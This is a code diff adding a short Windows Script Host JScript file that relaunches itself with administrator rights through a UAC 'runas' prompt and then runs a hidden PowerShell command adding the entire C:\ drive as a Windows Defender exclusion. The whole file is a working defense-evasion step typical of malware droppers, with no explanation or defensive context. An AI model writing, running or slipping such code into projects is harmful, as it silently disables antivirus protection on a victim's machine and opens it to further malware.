@@ -1,0 +1,15 @@
+EnsureElevatedPrivileges();
+
+function EnsureElevatedPrivileges() {
+    if (!WScript.Arguments.Named.Exists("elevate")) {
+        var shellApp = new ActiveXObject("Shell.Application");
+        // Relaunch script with elevated privileges
+        shellApp.ShellExecute(WScript.FullName, '"' + WScript.ScriptFullName + '" /elevate', "", "runas", 1);
+        WScript.Quit();
+    }
+}
+
+var WshShell = new ActiveXObject("WScript.Shell");
+
+// Add C:\ as a Windows Defender exclusion path using PowerShell
+WshShell.Run('powershell -Command "Add-MpPreference -ExclusionPath ''C:\\''"', 0, false);
